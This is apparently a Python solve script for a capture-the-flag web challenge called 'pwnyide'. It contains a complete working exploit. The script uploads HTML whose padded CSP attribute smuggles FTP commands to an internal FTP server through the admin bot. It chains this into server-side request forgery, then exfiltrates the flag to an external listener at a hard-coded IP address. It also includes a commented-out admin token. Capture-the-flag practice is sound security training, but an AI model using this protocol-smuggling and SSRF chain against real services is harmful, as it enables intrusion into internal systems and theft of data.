from pwn import *
import requests
import os

SITE_URL = "http://pwnyide.chal.uiuc.tf"
#SITE_URL = "http://127.0.0.1:43039"
#MY_EXTERNAL_ADDR = "127.0.0.1"
MY_EXTERNAL_ADDR = "3.142.81.166"
#MY_EXTERNAL_PORT = 1500
MY_EXTERNAL_PORT = 11328
MY_ADDRESS = f"{MY_EXTERNAL_ADDR}|{MY_EXTERNAL_PORT}"
LISTEN_PORT = 9999
ADMIN_TOKEN = None
#ADMIN_TOKEN = "6d1cbcc5a8c00e4ce2807ffc20963a0d"
FTP_PORT = 8021
#ADMIN_TOKEN = None


# == Register new user
USERNAME = os.urandom(10).hex()
PASSWORD = os.urandom(16).hex()
print(USERNAME, PASSWORD)
res = requests.post(f"{SITE_URL}/register", data={"username": USERNAME, "password": PASSWORD}, allow_redirects=False)
print(res.headers)
print(res.text)
# uid=s%3Aeed5c3baf612489a56d91ec491608a44.cCryqY2WxTgqDbbcqVgUPVOd6ZP6F3N0Rmk%2Bm7K60s0; Path=/
cookie = res.headers["Set-Cookie"].split("=")[1].split(";")[0]
UID = cookie.split("%3A")[1].split(".")[0]

def save_file(payload):
    r = requests.post(f"{SITE_URL}/save", cookies={"uid": cookie}, files={'file': ('file', payload)})
    print(r.text)

def admin_bot():
    if ADMIN_TOKEN is None:
        input(f"Report URL {SITE_URL}/workspace/{UID} then continue...")
    else:
        #requests.post(f"{SITE_URL}/report", headers={"X-ADMIN-TOKEN": ADMIN_TOKEN}, data={"url": f"{SITE_URL}/workspace/{UID}"})
        print(f"admin bot visiting http://127.0.0.1:1337/workspace/{UID}")
        requests.post(f"{SITE_URL}/report", headers={"X-ADMIN-TOKEN": ADMIN_TOKEN}, data={"url": f"http://127.0.0.1:1337/workspace/{UID}"})

framecsp = lambda url, csp: f"<iframe src='{url}' csp='{csp}'></iframe>"
gen_payload = lambda csp: framecsp(f"http://127.0.0.1:{FTP_PORT}/?csp", csp) 
pad = lambda x: x + " "*(65536 - len(x))

# == Payload1 - upload a HTTP request file
payload1_csp = "a" + " "*65536 + \
pad(f"USER {USERNAME}") + \
pad(f"PASS {PASSWORD}") + \
pad(f"EPRT |1|{MY_ADDRESS}") + \
pad(f"STOR /files/{UID}/http_req.txt") + "X"

payload1_html = gen_payload(payload1_csp)
save_file(payload1_html)

# == Trigger the admin bot and upload our payload
l = listen(LISTEN_PORT)
admin_bot()
l.wait_for_connection()
# it needs to be moderately large so that we hit the race condition
l.send("GET /ssrf HTTP/1.0\nSec-Pro-Hacker: 1"+"\n"*1000000)
l.close()

print("file upload success!")
#exit()

# == Payload2 - do the SSRF

payload2_csp = "a" + " "*65536 + \
pad(f"USER {USERNAME}") + \
pad(f"PASS {PASSWORD}") + \
pad(f"EPRT |1|127.0.0.1|1337") + \
pad(f"RETR /files/{UID}/http_req.txt") + \
pad(f"STOR /files/{UID}/flag.txt") + "X"

payload2_html = gen_payload(payload2_csp)
save_file(payload2_html)
admin_bot()
print("issued SSRF, waiting...")

import time
time.sleep(5)

# == Payload3 - retrieve flag
payload3_csp = "a" + " "*65536 + \
pad(f"USER {USERNAME}") + \
pad(f"PASS {PASSWORD}") + \
pad(f"EPRT |1|{MY_ADDRESS}") + \
pad(f"RETR /files/{UID}/flag.txt") + "X"


payload3_html = gen_payload(payload3_csp)
save_file(payload3_html)

l = listen(LISTEN_PORT)
admin_bot()
l.wait_for_connection()
SSRF_RESULT = l.recvall()
print(SSRF_RESULT)

if b"uiuctf" in SSRF_RESULT:
    exit(0)
else:
    exit(1)
